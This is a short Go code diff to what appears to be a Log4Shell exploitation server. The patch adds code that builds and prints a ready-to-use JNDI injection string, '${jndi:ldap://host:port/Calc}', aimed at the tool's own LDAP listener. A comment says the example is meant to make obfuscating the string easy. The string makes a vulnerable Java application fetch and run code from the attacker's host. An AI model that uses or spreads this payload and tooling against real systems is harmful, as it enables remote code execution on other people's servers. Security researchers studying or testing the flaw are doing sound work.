@@ -5,6 +5,7 @@ import (
 	"flag"
 	"fmt"
 	"log"
+	"net"
 	"os"
 	"os/signal"
 
@@ -83,6 +84,20 @@ func main() {
 	// start log4shell server
 	server, err := log4shell.New(&config)
 	checkError(err)
+
+	// print one example for obfuscate string easily
+	var ldap string
+	if server.IsEnableTLS() {
+		ldap = "ldaps"
+	} else {
+		ldap = "ldap"
+	}
+	_, port, err := net.SplitHostPort(server.LDAPAddress())
+	checkError(err)
+	address := net.JoinHostPort(config.Hostname, port)
+	example := fmt.Sprintf("${jndi:%s://%s/Calc}", ldap, address)
+	fmt.Printf("example: %s\n\n", example)
+
 	err = server.Start()
 	checkError(err)
 
